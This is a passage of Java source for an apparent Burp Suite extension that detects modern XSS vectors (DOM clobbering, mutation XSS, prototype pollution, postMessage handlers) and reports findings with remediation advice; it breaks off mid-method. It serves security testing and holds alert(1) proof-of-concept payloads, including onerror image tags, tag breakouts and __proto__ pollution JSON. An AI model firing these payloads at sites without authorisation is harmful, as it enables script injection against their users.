package burp;

import java.util.*;
import java.util.regex.*;
import java.nio.charset.StandardCharsets;

/**
 * Modern XSS Attack Vector Analyzer
 * Implements detection for advanced XSS techniques in modern web applications
 *
 * Covers:
 * - DOM Clobbering
 * - Mutation XSS (mXSS)
 * - Prototype Pollution XSS
 * - PostMessage XSS with Origin Validation
 * - Service Worker Hijacking
 * - Import Maps Manipulation
 * - Trusted Types Bypass
 * - GraphQL XSS
 * - WebSocket XSS
 */
public class ModernXSSAnalyzer {

    private final IExtensionHelpers helpers;
    private final IBurpExtenderCallbacks callbacks;
    private final Settings settings;

    // DOM Clobbering patterns
    private static final Pattern WINDOW_PROPERTY_ACCESS = Pattern.compile(
        "window\\s*\\.\\s*(\\w+)|window\\s*\\[\\s*['\"]?(\\w+)['\"]?\\s*\\]",
        Pattern.CASE_INSENSITIVE
    );

    private static final Pattern DOCUMENT_PROPERTY_ACCESS = Pattern.compile(
        "document\\s*\\.\\s*(\\w+)|document\\s*\\[\\s*['\"]?(\\w+)['\"]?\\s*\\]",
        Pattern.CASE_INSENSITIVE
    );

    private static final Pattern UNGUARDED_PROPERTY_ACCESS = Pattern.compile(
        "(?<!var\\s)(?<!let\\s)(?<!const\\s)(?<!function\\s)(?<!\\.)(\\b[a-zA-Z_$][a-zA-Z0-9_$]*\\b)\\s*\\.",
        Pattern.CASE_INSENSITIVE
    );

    // mXSS patterns - parsing context switches
    private static final String[] MXSS_CONTEXT_TAGS = {
        "noscript", "title", "textarea", "style", "script", "xmp",
        "iframe", "noembed", "noframes", "plaintext", "listing"
    };

    // Prototype Pollution patterns
    private static final Pattern PROTO_ACCESS = Pattern.compile(
        "__proto__|constructor\\s*\\.\\s*prototype|Object\\.prototype|prototype\\s*\\[",
        Pattern.CASE_INSENSITIVE
    );

    private static final Pattern OBJECT_MERGE = Pattern.compile(
        "Object\\.assign|\\.\\.\\.|extend\\(|merge\\(|deepMerge\\(|defaults\\(",
        Pattern.CASE_INSENSITIVE
    );

    // PostMessage patterns with origin check
    private static final Pattern POSTMESSAGE_HANDLER = Pattern.compile(
        "addEventListener\\s*\\(\\s*['\"]message['\"]|onmessage\\s*=",
        Pattern.CASE_INSENSITIVE
    );

    private static final Pattern ORIGIN_CHECK = Pattern.compile(
        "event\\.origin|e\\.origin|msg\\.origin|message\\.origin",
        Pattern.CASE_INSENSITIVE
    );

    // Service Worker patterns
    private static final Pattern SW_REGISTER = Pattern.compile(
        "navigator\\.serviceWorker\\.register\\s*\\(",
        Pattern.CASE_INSENSITIVE
    );

    private static final Pattern SW_CACHE = Pattern.compile(
        "caches\\.open|cache\\.put|cache\\.add",
        Pattern.CASE_INSENSITIVE
    );

    // Import Maps patterns
    private static final Pattern IMPORT_MAP = Pattern.compile(
        "<script\\s+type\\s*=\\s*['\"]importmap['\"]",
        Pattern.CASE_INSENSITIVE
    );

    private static final Pattern DYNAMIC_IMPORT = Pattern.compile(
        "import\\s*\\(\\s*[^'\"`]|import\\s*\\(\\s*`[^`]*\\$\\{",
        Pattern.CASE_INSENSITIVE
    );

    // Trusted Types patterns
    private static final Pattern TRUSTED_TYPES_POLICY = Pattern.compile(
        "trustedTypes\\.createPolicy",
        Pattern.CASE_INSENSITIVE
    );

    private static final Pattern DEFAULT_POLICY = Pattern.compile(
        "createPolicy\\s*\\(\\s*['\"]default['\"]",
        Pattern.CASE_INSENSITIVE
    );

    // GraphQL patterns
    private static final Pattern GRAPHQL_QUERY = Pattern.compile(
        "query\\s*\\{|mutation\\s*\\{|subscription\\s*\\{|__schema|__type",
        Pattern.CASE_INSENSITIVE
    );

    // WebSocket patterns
    private static final Pattern WEBSOCKET_CREATE = Pattern.compile(
        "new\\s+WebSocket\\s*\\(|io\\s*\\(|socket\\.connect",
        Pattern.CASE_INSENSITIVE
    );

    public ModernXSSAnalyzer(IExtensionHelpers helpers, IBurpExtenderCallbacks callbacks, Settings settings) {
        this.helpers = helpers;
        this.callbacks = callbacks;
        this.settings = settings;
    }

    // Minimum confidence to report a finding (below this = too speculative)
    private static final double MIN_REPORT_CONFIDENCE = 70.0;

    /**
     * Main analysis method - runs all modern XSS checks
     * CRITICAL: Only reports findings with actual evidence of exploitability.
     * Pure pattern presence (e.g., SVG on page + innerHTML somewhere) is NOT sufficient.
     */
    public ModernXSSResult analyzeForModernXSS(IHttpRequestResponse requestResponse) {
        ModernXSSResult result = new ModernXSSResult();

        try {
            if (requestResponse == null || requestResponse.getResponse() == null) {
                return result;
            }

            byte[] response = requestResponse.getResponse();

            // Skip non-HTML responses — modern XSS analysis only applies to rendered HTML
            try {
                IResponseInfo respInfo = helpers.analyzeResponse(response);
                for (String header : respInfo.getHeaders()) {
                    if (header.toLowerCase().startsWith("content-type:")) {
                        String ct = header.substring(header.indexOf(":") + 1).trim().toLowerCase();
                        if (ct.contains("application/json") || ct.contains("application/graphql") ||
                            ct.contains("image/") || ct.contains("font/") ||
                            ct.contains("application/octet-stream") || ct.contains("application/pdf")) {
                            return result; // Not HTML — modern XSS patterns not applicable
                        }
                        break;
                    }
                }
            } catch (Exception ignored) {}

            int bodyOffset = helpers.analyzeResponse(response).getBodyOffset();
            String responseBody = new String(
                Arrays.copyOfRange(response, bodyOffset, response.length),
                StandardCharsets.UTF_8
            );

            // Extract JavaScript code from response
            String jsCode = extractJavaScript(responseBody);

            // Collect reflected parameters for verification
            Map<String, ReflectedParam> reflectedParams = findReflectedParameters(responseBody, requestResponse);

            // Run all analyzers (pass reflected params for source-sink verification)
            result.domClobberingVulns = analyzeDOMClobbering(responseBody, jsCode, requestResponse);
            result.mxssVulns = analyzeMutationXSS(responseBody, requestResponse, reflectedParams);
            result.protoPollutionVulns = analyzePrototypePollution(responseBody, jsCode, requestResponse);
            result.postMessageVulns = analyzePostMessage(responseBody, jsCode, requestResponse);
            result.serviceWorkerVulns = analyzeServiceWorker(responseBody, jsCode, requestResponse);
            result.importMapVulns = analyzeImportMaps(responseBody, jsCode, requestResponse);
            result.trustedTypesVulns = analyzeTrustedTypes(responseBody, jsCode, requestResponse);
            result.graphqlVulns = analyzeGraphQL(responseBody, requestResponse);
            result.websocketVulns = analyzeWebSocket(responseBody, jsCode, requestResponse);

            // CRITICAL: Filter out findings below minimum confidence threshold
            filterByMinimumConfidence(result);

            // Calculate overall risk
            result.calculateOverallRisk();

        } catch (Exception e) {
            callbacks.printError("[ModernXSSAnalyzer] Error: " + e.getMessage());
        }

        return result;
    }

    /**
     * Remove all findings below minimum confidence threshold.
     * This prevents noisy, speculative reports that waste pentester time.
     */
    private void filterByMinimumConfidence(ModernXSSResult result) {
        result.domClobberingVulns.removeIf(v -> v.confidence < MIN_REPORT_CONFIDENCE);
        result.mxssVulns.removeIf(v -> v.confidence < MIN_REPORT_CONFIDENCE);
        result.protoPollutionVulns.removeIf(v -> v.confidence < MIN_REPORT_CONFIDENCE);
        result.postMessageVulns.removeIf(v -> v.confidence < MIN_REPORT_CONFIDENCE);
        result.serviceWorkerVulns.removeIf(v -> v.confidence < MIN_REPORT_CONFIDENCE);
        result.importMapVulns.removeIf(v -> v.confidence < MIN_REPORT_CONFIDENCE);
        result.trustedTypesVulns.removeIf(v -> v.confidence < MIN_REPORT_CONFIDENCE);
        result.graphqlVulns.removeIf(v -> v.confidence < MIN_REPORT_CONFIDENCE);
        result.websocketVulns.removeIf(v -> v.confidence < MIN_REPORT_CONFIDENCE);
    }

    /**
     * Find all parameters whose values are actually reflected in the response body.
     * This is the foundation - if a parameter value isn't reflected, it can't cause XSS.
     */
    private Map<String, ReflectedParam> findReflectedParameters(String responseBody, IHttpRequestResponse requestResponse) {
        Map<String, ReflectedParam> reflected = new LinkedHashMap<>();
        try {
            IRequestInfo reqInfo = helpers.analyzeRequest(requestResponse);
            List<IParameter> params = reqInfo.getParameters();
            String lowerBody = responseBody.toLowerCase();

            for (IParameter param : params) {
                String value = param.getValue();
                if (value == null || value.length() < 4) continue;

                // URL-decode the value for matching
                String decodedValue = helpers.urlDecode(value);
                String lowerValue = decodedValue.toLowerCase();

                // Check if the value appears in the response
                int pos = lowerBody.indexOf(lowerValue);
                if (pos >= 0) {
                    ReflectedParam rp = new ReflectedParam();
                    rp.param = param;
                    rp.decodedValue = decodedValue;
                    rp.reflectionPositions = new ArrayList<>();
                    // Find ALL reflection positions
                    int searchFrom = 0;
                    while (searchFrom < lowerBody.length()) {
                        int found = lowerBody.indexOf(lowerValue, searchFrom);
                        if (found < 0) break;
                        rp.reflectionPositions.add(found);
                        searchFrom = found + 1;
                    }
                    reflected.put(param.getName(), rp);
                }
            }
        } catch (Exception e) {
            callbacks.printError("[ModernXSSAnalyzer] Error finding reflected params: " + e.getMessage());
        }
        return reflected;
    }

    /** Helper class for tracking reflected parameter data */
    private static class ReflectedParam {
        IParameter param;
        String decodedValue;
        List<Integer> reflectionPositions;
    }

    // ==================== DOM CLOBBERING ANALYSIS ====================

    /**
     * Analyze for DOM Clobbering vulnerabilities
     * DOM Clobbering exploits named element access via window/document
     */
    private List<VulnerabilityInfo> analyzeDOMClobbering(String responseBody, String jsCode,
                                                          IHttpRequestResponse requestResponse) {
        List<VulnerabilityInfo> vulns = new ArrayList<>();

        try {
            // Find all property accesses that could be clobbered
            Set<String> vulnerableProperties = new HashSet<>();

            // Check window.propertyName access
            Matcher windowMatcher = WINDOW_PROPERTY_ACCESS.matcher(jsCode);
            while (windowMatcher.find()) {
                String prop = windowMatcher.group(1) != null ? windowMatcher.group(1) : windowMatcher.group(2);
                if (prop != null && !isBuiltinProperty(prop)) {
                    vulnerableProperties.add(prop);
                }
            }

            // Check document.propertyName access
            Matcher docMatcher = DOCUMENT_PROPERTY_ACCESS.matcher(jsCode);
            while (docMatcher.find()) {
                String prop = docMatcher.group(1) != null ? docMatcher.group(1) : docMatcher.group(2);
                if (prop != null && !isBuiltinDocumentProperty(prop)) {
                    vulnerableProperties.add(prop);
                }
            }

            // Check for unguarded direct property access (global variables)
            Matcher ungardedMatcher = UNGUARDED_PROPERTY_ACCESS.matcher(jsCode);
            while (ungardedMatcher.find()) {
                String prop = ungardedMatcher.group(1);
                if (prop != null && !isJavaScriptKeyword(prop) && prop.length() > 2) {
                    // Check if this property is used unsafely (e.g., .innerHTML, .href, etc.)
                    int propEnd = ungardedMatcher.end();
                    String afterProp = jsCode.substring(propEnd, Math.min(propEnd + 50, jsCode.length()));
                    if (isUnsafePropertyUsage(afterProp)) {
                        vulnerableProperties.add(prop);
                    }
                }
            }

            String targetUrl = extractTargetUrl(requestResponse);

            // For each vulnerable property, find the JS line that accesses it for evidence
            Map<String, String> propertyEvidence = new HashMap<>();
            for (String prop : vulnerableProperties) {
                // Find the JS code line accessing this property
                Pattern propUsage = Pattern.compile(
                    "(?:window\\s*\\.\\s*" + Pattern.quote(prop) + "|document\\s*\\.\\s*" + Pattern.quote(prop) + "|\\b" + Pattern.quote(prop) + "\\b)\\s*\\.",
                    Pattern.CASE_INSENSITIVE
                );
                Matcher evidenceMatcher = propUsage.matcher(jsCode);
                if (evidenceMatcher.find()) {
                    propertyEvidence.put(prop, extractCodeSnippet(jsCode, evidenceMatcher.start(), 100));
                }
            }

            // For each vulnerable property, check if it can be injected
            IRequestInfo reqInfo = helpers.analyzeRequest(requestResponse);
            List<IParameter> params = reqInfo.getParameters();

            for (String prop : vulnerableProperties) {
                // Check if parameter name matches or if we can inject HTML with name/id
                for (IParameter param : params) {
                    String paramValue = param.getValue();
                    if (paramValue != null && (
                        paramValue.toLowerCase().contains("<form") ||
                        paramValue.toLowerCase().contains("<input") ||
                        paramValue.toLowerCase().contains("<img") ||
                        paramValue.toLowerCase().contains("<a ") ||
                        paramValue.contains("name=") ||
                        paramValue.contains("id="))) {

                        // Detect what unsafe property is used after the clobbered access
                        String sinkUsed = null;
                        Pattern afterPropPattern = Pattern.compile(
                            "\\b" + Pattern.quote(prop) + "\\b\\s*\\.\\s*(\\w+)",
                            Pattern.CASE_INSENSITIVE
                        );
                        Matcher sinkMatcher = afterPropPattern.matcher(jsCode);
                        if (sinkMatcher.find()) {
                            String afterPropVal = sinkMatcher.group(1);
                            if (isUnsafePropertyUsage("." + afterPropVal)) {
                                sinkUsed = prop + "." + afterPropVal;
                            }
                        }

                        VulnerabilityInfo vuln = new VulnerabilityInfo();
                        vuln.type = "DOM Clobbering";
                        vuln.severity = "High";
                        vuln.confidence = 75.0;
                        vuln.description = "Property '" + prop + "' can be clobbered via HTML injection";
                        vuln.parameter = param.getName();
                        vuln.targetUrl = targetUrl;
                        vuln.sinkType = sinkUsed;
                        vuln.evidence = propertyEvidence.get(prop);
                        vuln.payload = generateDOMClobberingPayload(prop);
                        vuln.remediation = "Use explicit getElementById/querySelector instead of window property access. " +
                                          "Validate that accessed properties are the expected type.";
                        populateRequestContext(vuln, param, requestResponse);
                        vulns.add(vuln);
                        break;
                    }
                }
            }

            // Also check for existing form/input elements that could be exploited
            Pattern existingElements = Pattern.compile(
                "<(form|input|img|a|embed|object)\\s+[^>]*(?:name|id)\\s*=\\s*['\"]?(\\w+)['\"]?",
                Pattern.CASE_INSENSITIVE
            );
            Set<String> reportedExistingElements = new HashSet<>();
            Matcher elemMatcher = existingElements.matcher(responseBody);
            while (elemMatcher.find()) {
                String elementName = elemMatcher.group(2);
                if (vulnerableProperties.contains(elementName) && !reportedExistingElements.contains(elementName)) {
                    reportedExistingElements.add(elementName);
                    VulnerabilityInfo vuln = new VulnerabilityInfo();
                    vuln.type = "DOM Clobbering (Existing Element)";
                    vuln.severity = "Medium";
                    vuln.confidence = 85.0;
                    vuln.description = "Existing element with name/id='" + elementName +
                                      "' may clobber JavaScript property access";
                    vuln.parameter = "N/A (existing element)";
                    vuln.targetUrl = targetUrl;
                    vuln.evidence = propertyEvidence.get(elementName);
                    vuln.payload = "Element already exists: <" + elemMatcher.group(1) + " name=\"" + elementName + "\">";
                    vuln.remediation = "Rename element or use explicit DOM selection methods.";
                    vuln.httpMethod = extractHttpMethod(requestResponse);
                    vulns.add(vuln);
                }
            }

        } catch (Exception e) {
            callbacks.printError("[DOMClobbering] Error: " + e.getMessage());
        }

        return vulns;
    }

    private String generateDOMClobberingPayload(String propertyName) {
        return "<form name=\"" + propertyName + "\"><input name=\"innerHTML\" value=\"<img src=x onerror=alert(1)>\"></form>";
    }

    private boolean isBuiltinProperty(String prop) {
        Set<String> builtins = new HashSet<>(Arrays.asList(
            "location", "document", "history", "navigator", "screen", "localStorage",
            "sessionStorage", "console", "alert", "confirm", "prompt", "setTimeout",
            "setInterval", "clearTimeout", "clearInterval", "fetch", "XMLHttpRequest",
            "Array", "Object", "String", "Number", "Boolean", "Function", "Math", "Date",
            "JSON", "Promise", "Map", "Set", "WeakMap", "WeakSet", "Symbol", "Proxy",
            "Reflect", "Error", "TypeError", "ReferenceError", "SyntaxError", "self",
            "top", "parent", "frames", "opener", "closed", "length", "name", "status"
        ));
        return builtins.contains(prop);
    }

    private boolean isBuiltinDocumentProperty(String prop) {
        Set<String> builtins = new HashSet<>(Arrays.asList(
            "body", "head", "documentElement", "getElementById", "getElementsByClassName",
            "getElementsByTagName", "querySelector", "querySelectorAll", "createElement",
            "createTextNode", "cookie", "domain", "referrer", "title", "URL", "location",
            "readyState", "activeElement", "forms", "images", "links", "scripts", "styleSheets"
        ));
        return builtins.contains(prop);
    }

    private boolean isJavaScriptKeyword(String prop) {
        Set<String> keywords = new HashSet<>(Arrays.asList(
            "var", "let", "const", "function", "class", "if", "else", "for", "while",
            "do", "switch", "case", "break", "continue", "return", "throw", "try",
            "catch", "finally", "new", "delete", "typeof", "instanceof", "in", "of",
            "this", "super", "import", "export", "default", "async", "await", "yield",
            "true", "false", "null", "undefined", "NaN", "Infinity"
        ));
        return keywords.contains(prop);
    }

    private boolean isUnsafePropertyUsage(String afterProp) {
        String[] unsafeProps = {"innerHTML", "outerHTML", "href", "src", "action", "data",
                               "value", "textContent", "innerText", "setAttribute"};
        String lower = afterProp.toLowerCase();
        for (String unsafe : unsafeProps) {
            if (lower.contains(unsafe.toLowerCase())) {
                return true;
            }
        }
        return false;
    }

    // ==================== MUTATION XSS (mXSS) ANALYSIS ====================

    /**
     * Analyze for Mutation XSS vulnerabilities.
     *
     * CRITICAL FIX: This method now REQUIRES actual evidence that user input reaches
     * an mXSS-prone context. Previously, it blindly flagged any page with SVG + innerHTML
     * (e.g., Google search results with SVG icons = false positive).
     *
     * Now requires ALL of:
     * 1. A dangerous sink (innerHTML/outerHTML/insertAdjacentHTML) exists in JS code (not HTML)
     * 2. User parameter value is ACTUALLY REFLECTED in the response
     * 3. The reflection is INSIDE or NEAR an mXSS-prone context tag
     */
    private List<VulnerabilityInfo> analyzeMutationXSS(String responseBody,
                                                        IHttpRequestResponse requestResponse,
                                                        Map<String, ReflectedParam> reflectedParams) {
        List<VulnerabilityInfo> vulns = new ArrayList<>();

        try {
            String targetUrl = extractTargetUrl(requestResponse);

            // Extract JS code to check for sinks (look in <script> blocks, NOT raw HTML)
            String jsCode = extractJavaScript(responseBody);

            // Step 1: Find innerHTML-type sinks in JAVASCRIPT CODE (not HTML body)
            // A word like "innerHTML" in HTML text is irrelevant; it must be in executable JS
            List<String> mxssSinks = new ArrayList<>();
            Pattern sinkInJS = Pattern.compile(
                "\\.innerHTML\\s*=|\\.outerHTML\\s*=|\\.insertAdjacentHTML\\s*\\(",
                Pattern.CASE_INSENSITIVE
            );
            Matcher sinkMatcher = sinkInJS.matcher(jsCode);
            Set<String> foundSinks = new HashSet<>();
            while (sinkMatcher.find()) {
                String match = sinkMatcher.group().toLowerCase();
                if (match.contains("innerhtml") && !foundSinks.contains("innerHTML")) {
                    mxssSinks.add("innerHTML"); foundSinks.add("innerHTML");
                } else if (match.contains("outerhtml") && !foundSinks.contains("outerHTML")) {
                    mxssSinks.add("outerHTML"); foundSinks.add("outerHTML");
                } else if (match.contains("insertadjacenthtml") && !foundSinks.contains("insertAdjacentHTML")) {
                    mxssSinks.add("insertAdjacentHTML"); foundSinks.add("insertAdjacentHTML");
                }
            }

            if (mxssSinks.isEmpty()) {
                return vulns; // No innerHTML-type sink in JS code = no mXSS vector
            }

            String sinksStr = String.join(", ", mxssSinks);

            // Find the actual JS sink line for evidence
            String sinkEvidence = null;
            Matcher evidenceMatcher = sinkInJS.matcher(jsCode);
            if (evidenceMatcher.find()) {
                sinkEvidence = extractCodeSnippet(jsCode, evidenceMatcher.start(), 120);
            }

            // Step 2: REQUIRE at least one reflected parameter.
            // If no user input is reflected at all, there's nothing to exploit.
            if (reflectedParams.isEmpty()) {
                return vulns;
            }

            // Step 3: Check mXSS-prone context tags - ONLY report when user input
            // is ACTUALLY REFLECTED inside or immediately adjacent to the context tag
            Set<String> reportedMxss = new HashSet<>();
            for (String tag : MXSS_CONTEXT_TAGS) {
                Pattern tagPattern = Pattern.compile(
                    "<" + tag + "[^>]*>([\\s\\S]*?)</" + tag + ">",
                    Pattern.CASE_INSENSITIVE
                );
                Matcher matcher = tagPattern.matcher(responseBody);

                while (matcher.find()) {
                    int tagStart = matcher.start();
                    int tagEnd = matcher.end();

                    // Check each reflected parameter: is it reflected INSIDE this tag?
                    for (Map.Entry<String, ReflectedParam> entry : reflectedParams.entrySet()) {
                        ReflectedParam rp = entry.getValue();
                        String mxssKey = tag + "|" + rp.param.getName();
                        if (reportedMxss.contains(mxssKey)) continue;

                        for (int reflectionPos : rp.reflectionPositions) {
                            // The reflection must be INSIDE the tag content or within 50 chars of it
                            boolean insideTag = reflectionPos >= tagStart && reflectionPos < tagEnd;
                            boolean nearTag = Math.abs(reflectionPos - tagStart) < 50 ||
                                             Math.abs(reflectionPos - tagEnd) < 50;

                            if (insideTag || nearTag) {
                                reportedMxss.add(mxssKey);
                                String tagEvidence = extractCodeSnippet(responseBody, matcher.start(), 100);

                                VulnerabilityInfo vuln = new VulnerabilityInfo();
                                vuln.type = "Mutation XSS (mXSS)";
                                vuln.severity = "High";
                                // Higher confidence if INSIDE, lower if only NEAR
                                vuln.confidence = insideTag ? 80.0 : 72.0;
                                vuln.description = "Parameter '" + rp.param.getName() + "' value is reflected " +
                                    (insideTag ? "INSIDE" : "near") + " a <" + tag + "> context. " +
                                    "Combined with " + sinksStr + " sink in JS, this creates an mXSS vector: " +
                                    "when innerHTML re-parses the <" + tag + "> content, the parser context " +
                                    "switches and the payload can break out.";
                                vuln.parameter = rp.param.getName();
                                vuln.targetUrl = targetUrl;
                                vuln.sinkType = sinksStr;
                                vuln.evidence = sinkEvidence != null
                                    ? "JS Sink:\n" + sinkEvidence + "\n\nmXSS Context:\n" + tagEvidence
                                    : tagEvidence;
                                vuln.payload = generateMXSSPayload(tag);
                                vuln.remediation = "Avoid innerHTML with user content. Use textContent or " +
                                    "a trusted sanitizer like DOMPurify with mutation XSS protections.";
                                populateRequestContext(vuln, rp.param, requestResponse);
                                vulns.add(vuln);
                                break; // One report per tag+param combo
                            }
                        }
                    }
                }
            }

            // Step 4: SVG/MathML context switching - ONLY when user input is reflected
            // inside the SVG/MathML element (not just because SVG icons exist on the page)
            String[] svgMathTags = {"svg", "math"};
            for (String svgMathTag : svgMathTags) {
                Pattern svgMathPattern = Pattern.compile(
                    "<" + svgMathTag + "[^>]*>[\\s\\S]*?</" + svgMathTag + ">",
                    Pattern.CASE_INSENSITIVE
                );
                Matcher svgMatcher = svgMathPattern.matcher(responseBody);

                while (svgMatcher.find()) {
                    int svgStart = svgMatcher.start();
                    int svgEnd = svgMatcher.end();

                    // Check if any reflected param is INSIDE this SVG/MathML block
                    for (Map.Entry<String, ReflectedParam> entry : reflectedParams.entrySet()) {
                        ReflectedParam rp = entry.getValue();
                        String mxssKey = svgMathTag + "|" + rp.param.getName();
                        if (reportedMxss.contains(mxssKey)) continue;

                        for (int reflectionPos : rp.reflectionPositions) {
                            if (reflectionPos >= svgStart && reflectionPos < svgEnd) {
                                reportedMxss.add(mxssKey);

                                String svgEvidence = extractCodeSnippet(responseBody, svgMatcher.start(), 150);

                                VulnerabilityInfo vuln = new VulnerabilityInfo();
                                vuln.type = "Mutation XSS (SVG/MathML Context)";
                                vuln.severity = "High";
                                vuln.confidence = 78.0;
                                vuln.description = "Parameter '" + rp.param.getName() + "' value is reflected " +
                                    "INSIDE a <" + svgMathTag + "> element. Combined with " + sinksStr +
                                    " sink in JS code, this creates a parser context-switching mXSS vector.";
                                vuln.parameter = rp.param.getName();
                                vuln.targetUrl = targetUrl;
                                vuln.sinkType = sinksStr;
                                vuln.evidence = sinkEvidence != null
                                    ? "JS Sink:\n" + sinkEvidence + "\n\nSVG/MathML Reflection:\n" + svgEvidence
                                    : svgEvidence;
                                vuln.payload = "<" + svgMathTag + "><foreignObject><img src=x onerror=alert(1)></foreignObject></" + svgMathTag + ">";
                                vuln.remediation = "Sanitize SVG/MathML content carefully. Use DOMPurify with " +
                                    "FORBID_TAGS for foreignObject. Consider CSP to restrict inline scripts.";
                                populateRequestContext(vuln, rp.param, requestResponse);
                                vulns.add(vuln);
                                break;
                            }
                        }
                    }
                }
            }

        } catch (Exception e) {
            callbacks.printError("[mXSS] Error: " + e.getMessage());
        }

        return vulns;
    }

    private String generateMXSSPayload(String contextTag) {
        switch (contextTag.toLowerCase()) {
            case "noscript":
                return "<noscript><img src=x onerror=alert(1)></noscript>";
            case "title":
                return "</title><img src=x onerror=alert(1)>";
            case "textarea":
                return "</textarea><img src=x onerror=alert(1)>";
            case "style":
                return "</style><img src=x onerror=alert(1)>";
            case "script":
                return "</script><img src=x onerror=alert(1)>";
            case "iframe":
                return "<iframe srcdoc=\"<img src=x onerror=alert(1)>\">";
            case "xmp":
            case "plaintext":
            case "listing":
                return "</" + contextTag + "><img src=x onerror=alert(1)>";
            default:
                return "<img src=x onerror=alert(1)>";
        }
    }

    // couldReflectHere() REMOVED - was a pure heuristic that guessed based on parameter
    // names like "query", "search", "content" without checking actual reflection.
    // This caused false positives (e.g., Google's "q" parameter name matched "query").
    // Replaced by findReflectedParameters() which checks ACTUAL value reflection.

    // ==================== PROTOTYPE POLLUTION XSS ANALYSIS ====================

    /**
     * Analyze for Prototype Pollution leading to XSS
     */
    private List<VulnerabilityInfo> analyzePrototypePollution(String responseBody, String jsCode,
                                                               IHttpRequestResponse requestResponse) {
        List<VulnerabilityInfo> vulns = new ArrayList<>();

        try {
            String targetUrl = extractTargetUrl(requestResponse);

            // Check for object merge operations
            Matcher mergeMatcher = OBJECT_MERGE.matcher(jsCode);
            boolean hasObjectMerge = mergeMatcher.find();
            String mergeEvidence = null;
            if (hasObjectMerge) {
                mergeEvidence = extractCodeSnippet(jsCode, mergeMatcher.start(), 120);
            }

            // Check for __proto__ or constructor.prototype access
            boolean hasProtoAccess = PROTO_ACCESS.matcher(jsCode).find();

            if (!hasObjectMerge && !hasProtoAccess) {
                boolean hasVulnerableLib = jsCode.contains("lodash") ||
                                          jsCode.contains("jquery.extend") ||
                                          jsCode.contains("$.extend") ||
                                          jsCode.contains("underscore");
                if (!hasVulnerableLib) {
                    return vulns;
                }
            }

            // Check for sinks that could execute if prototype is polluted
            List<String> detectedSinks = detectSinks(jsCode);
            // Also check for attribute-based sinks specific to prototype pollution
            String[] ppExtraSinks = {"href", "src", "onclick", "onerror", "onload"};
            for (String sink : ppExtraSinks) {
                if (jsCode.toLowerCase().contains(sink.toLowerCase()) && !detectedSinks.contains(sink)) {
                    detectedSinks.add(sink);
                }
            }

            if (!detectedSinks.isEmpty()) {
                String sinksStr = String.join(", ", detectedSinks);

                // Check request parameters for PP payloads
                IRequestInfo reqInfo = helpers.analyzeRequest(requestResponse);
                for (IParameter param : reqInfo.getParameters()) {
                    String paramValue = param.getValue();
                    if (paramValue != null &&
                        (paramValue.contains("__proto__") ||
                         paramValue.contains("constructor") ||
                         paramValue.contains("prototype"))) {

                        VulnerabilityInfo vuln = new VulnerabilityInfo();
                        vuln.type = "Prototype Pollution XSS";
                        vuln.severity = "Critical";
                        vuln.confidence = 80.0;
                        vuln.description = "Prototype pollution vector detected. Polluted properties " +
                            "could reach sinks: " + sinksStr;
                        vuln.parameter = param.getName();
                        vuln.targetUrl = targetUrl;
                        vuln.sinkType = sinksStr;
                        vuln.evidence = mergeEvidence;
                        vuln.payload = generatePrototypePollutionPayload(detectedSinks.get(0));
                        vuln.remediation = "Use Object.create(null) for lookup objects. " +
                            "Validate and sanitize object keys. Use Map instead of plain objects.";
                        populateRequestContext(vuln, param, requestResponse);
                        vulns.add(vuln);
                    }
                }

                // Object merge + sinks WITHOUT explicit PP payload in request:
                // This is purely informational - just having merge + sinks doesn't mean
                // the app is vulnerable. Don't report unless aggressive mode is enabled.
                // The 55% confidence was below threshold anyway, but we make intent clear.
            }

        } catch (Exception e) {
            callbacks.printError("[PrototypePollution] Error: " + e.getMessage());
        }

        return vulns;
    }

    private String generatePrototypePollutionPayload(String targetSink) {
        switch (targetSink.toLowerCase()) {
            case "innerhtml":
            case "outerhtml":
                return "{\"__proto__\":{\"innerHTML\":\"<img src=x onerror=alert(1)>\"}}";
            case "href":
            case "src":
                return "{\"__proto__\":{\"" + targetSink + "\":\"javascript:alert(1)\"}}";
            case "onclick":
            case "onerror":
            case "onload":
                return "{\"__proto__\":{\"" + targetSink + "\":\"alert(1)\"}}";
            default:
                return "{\"__proto__\":{\"polluted\":\"<img src=x onerror=alert(1)>\"}}";
        }
    }

    // ==================== POSTMESSAGE XSS ANALYSIS ====================

    /**
     * Analyze for PostMessage XSS with Origin Validation bypass
     */
    private List<VulnerabilityInfo> analyzePostMessage(String responseBody, String jsCode,
                                                        IHttpRequestResponse requestResponse) {
        List<VulnerabilityInfo> vulns = new ArrayList<>();

        try {
            String targetUrl = extractTargetUrl(requestResponse);

            // Find postMessage handlers
            Matcher handlerMatcher = POSTMESSAGE_HANDLER.matcher(jsCode);

            while (handlerMatcher.find()) {
                int handlerPos = handlerMatcher.start();

                // Extract handler function body (approximate)
                int funcStart = jsCode.indexOf("{", handlerPos);
                if (funcStart < 0 || funcStart > handlerPos + 200) continue;

                int funcEnd = findMatchingBrace(jsCode, funcStart);
                if (funcEnd < 0) continue;

                String handlerBody = jsCode.substring(funcStart, Math.min(funcEnd + 1, jsCode.length()));

                // Check for origin validation
                boolean hasOriginCheck = ORIGIN_CHECK.matcher(handlerBody).find();

                // Detect sinks and data keys ONLY within the handler body
                // This ensures data flow: message -> handler -> sink
                List<String> sinks = detectSinks(handlerBody);
                List<String> dataKeys = extractMessageDataKeys(handlerBody);
                boolean hasUnsafeSink = !sinks.isEmpty();

                // Fallback: check handler body for sink patterns detectSinks() might miss
                // (e.g., partial code with different whitespace). Only check HANDLER, not full JS.
                if (!hasUnsafeSink) {
                    String lowerHandler = handlerBody.toLowerCase();
                    if (lowerHandler.contains("innerhtml")) { sinks.add("innerHTML"); hasUnsafeSink = true; }
                    if (lowerHandler.contains("eval(") || lowerHandler.contains("eval (")) { sinks.add("eval"); hasUnsafeSink = true; }
                    if (lowerHandler.contains("document.write")) { sinks.add("document.write"); hasUnsafeSink = true; }
                    if (lowerHandler.contains("srcdoc")) { sinks.add("srcdoc"); hasUnsafeSink = true; }
                }

                // Check for wildcard origin in postMessage send
                boolean hasWildcardSend = jsCode.contains("postMessage(") &&
                                         jsCode.contains("'*'");

                String sinksStr = String.join(", ", sinks);
                String keysStr = String.join(", ", dataKeys);
                String truncatedHandler = truncateHandler(handlerBody, 500);

                if (!hasOriginCheck && hasUnsafeSink) {
                    VulnerabilityInfo vuln = new VulnerabilityInfo();
                    vuln.type = "PostMessage XSS (No Origin Validation)";
                    vuln.severity = "High";
                    vuln.confidence = 85.0;
                    vuln.description = "PostMessage handler without origin validation uses unsafe sink(s): " +
                        sinksStr + ". Attacker can send malicious messages from any origin.";
                    vuln.parameter = "postMessage event.data";
                    vuln.targetUrl = targetUrl;
